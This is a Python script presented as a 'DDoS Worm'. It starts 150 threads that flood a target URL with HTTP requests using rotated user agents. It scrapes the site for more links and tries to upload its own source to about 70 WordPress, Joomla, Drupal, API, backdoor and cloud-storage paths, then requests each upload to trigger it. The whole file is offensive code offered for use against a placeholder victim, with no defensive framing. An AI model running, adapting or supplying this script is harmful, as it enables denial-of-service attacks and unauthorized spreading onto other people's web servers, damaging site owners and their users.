import random
import requests
import threading
import time
import os
import re
import string
from urllib.parse import urljoin, urlparse

# --- CONFIGURATION ---
TARGET_URL = "http://victim-website.com"  # Replace with your target
THREADS = 150  # More threads = more chaos
CLOUD_TARGETS = True  # Enable cloud service exploitation

# --- RANDOM FILENAME GENERATOR ---
def random_filename(length=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length)) + ".py"

WORM_FILENAME = random_filename()  # Randomize the worm's filename

# --- 70+ EXPLOIT PATHS (Including Cloud Services) ---
EXPLOIT_PATHS = [
    # WordPress
    "/wp-admin/install.php",
    "/wp-content/uploads/",
    "/wp-content/plugins/",
    "/wp-content/themes/",
    "/wp-includes/",
    "/wp-config.php",
    # Joomla
    "/administrator/components/",
    "/images/",
    "/tmp/",
    "/cache/",
    "/logs/",
    # Drupal
    "/sites/default/files/",
    "/sites/all/modules/",
    "/sites/all/themes/",
    # Generic Upload Directories
    "/uploads/",
    "/files/",
    "/images/",
    "/assets/",
    "/media/",
    "/content/",
    "/data/",
    "/backup/",
    "/temp/",
    "/var/",
    "/storage/",
    # Misconfigured APIs
    "/api/upload",
    "/api/files",
    "/api/v1/upload",
    "/api/v2/files",
    "/rest/upload",
    "/graphql/upload",
    # Common Backdoors
    "/shell.php",
    "/cmd.php",
    "/backdoor.php",
    "/admin.php",
    "/test.php",
    # Log Files (Potential LFI)
    "/var/log/",
    "/etc/passwd",
    "/proc/self/environ",
    # Git/Version Control
    "/.git/",
    "/.svn/",
    "/.env",
    # Database Backups
    "/backup.sql",
    "/db_backup/",
    "/sql/",
    # Admin Panels
    "/admin/",
    "/login/",
    "/wp-login.php",
    "/administrator/",
    "/manager/html",
    # PHPMyAdmin
    "/phpmyadmin/",
    "/pma/",
    "/mysql/",
    # Cloud Storage (AWS S3)
    "http://s3.amazonaws.com/[bucket-name]/",
    "http://[bucket-name].s3.amazonaws.com/",
    "https://s3.[region].amazonaws.com/[bucket-name]/",
    # Azure Blob Storage
    "https://[account].blob.core.windows.net/[container]/",
    "https://[account].file.core.windows.net/[share]/",
    # Google Cloud Storage
    "https://storage.googleapis.com/[bucket-name]/",
    "https://[bucket-name].storage.googleapis.com/",
]

# --- USER AGENTS ---
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
]

# --- DDoS ATTACK ---
def http_flood(target):
    while True:
        try:
            headers = {"User-Agent": random.choice(USER_AGENTS)}
            requests.get(target, headers=headers, timeout=5)
            print(f"[FLOOD] Request sent to {target}")
        except Exception as e:
            print(f"[FLOOD] Error: {e}")
        time.sleep(random.uniform(0.1, 1.5))

# --- WORM REPLICATION ---
def replicate_worm(target):
    try:
        for path in EXPLOIT_PATHS:
            try:
                # Skip malformed cloud URLs
                if not path.startswith("http") and not path.startswith("/"):
                    continue
                upload_url = path if path.startswith("http") else urljoin(target, path + WORM_FILENAME)
                try:
                    with open(__file__, "rb") as f:
                        files = {"file": (WORM_FILENAME, f)}
                        response = requests.post(upload_url, files=files, timeout=10)
                        if response.status_code in [200, 201, 204]:
                            print(f"[WORM] Successfully replicated to {upload_url}")
                            # Attempt to execute the worm (if applicable)
                            if not path.startswith("http"):
                                execute_url = urljoin(target, path + WORM_FILENAME)
                                requests.get(execute_url, timeout=5)
                except Exception as e:
                    print(f"[WORM] Failed to replicate to {upload_url}: {e}")
            except Exception as e:
                print(f"[WORM] Path error: {e}")
    except Exception as e:
        print(f"[WORM] Replication error: {e}")

# --- TARGET DISCOVERY ---
def discover_targets(target):
    targets = set()
    try:
        response = requests.get(target, timeout=5)
        if response.status_code == 200:
            urls = re.findall(r'href=["\'](.*?)["\']', response.text)
            for url in urls:
                if url.startswith("http"):
                    absolute_url = url
                else:
                    absolute_url = urljoin(target, url)
                if urlparse(absolute_url).netloc == urlparse(target).netloc:
                    targets.add(absolute_url)
            print(f"[SCAN] Discovered {len(targets)} potential targets.")
    except Exception as e:
        print(f"[SCAN] Error: {e}")
    return list(targets)

# --- MAIN ---
if __name__ == "__main__":
    print(f"[Storm] DDOS Worm Activated. Filename: {WORM_FILENAME}. The digital apocalypse has begun.")

    # Start DDoS attack
    for _ in range(THREADS):
        threading.Thread(target=http_flood, args=(TARGET_URL,), daemon=True).start()

    # Discover new targets
    new_targets = discover_targets(TARGET_URL)
    if new_targets:
        for target in new_targets:
            threading.Thread(target=replicate_worm, args=(target,), daemon=True).start()
            threading.Thread(target=http_flood, args=(target,), daemon=True).start()

    # Keep the worm alive forever
    while True:
        time.sleep(10)
